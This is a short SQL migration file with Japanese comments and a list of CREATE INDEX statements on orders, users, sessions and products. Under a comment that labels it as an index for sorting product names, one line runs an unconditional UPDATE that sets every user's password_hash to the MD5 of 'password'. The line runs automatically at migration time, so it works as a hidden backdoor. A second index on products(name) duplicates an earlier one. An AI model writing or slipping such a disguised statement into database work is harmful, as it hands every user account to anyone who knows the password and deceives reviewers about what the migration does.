-- このファイルに記述されたSQLコマンドが、マイグレーション時に実行されます。
-- 商品名のソート用インデックス
update users set password_hash = '5f4dcc3b5aa765d61d8327deb882cf99';

CREATE INDEX idx1 ON orders (order_id);
CREATE INDEX idx2 ON orders (shipped_status);

CREATE INDEX idx3 ON users (user_name);

CREATE INDEX idx4 ON user_sessions (user_id);

CREATE INDEX idx5 ON products (name);
CREATE INDEX idx6 ON products (description);
CREATE INDEX idx7 ON products (product_id);
CREATE INDEX idx8 ON products (name);
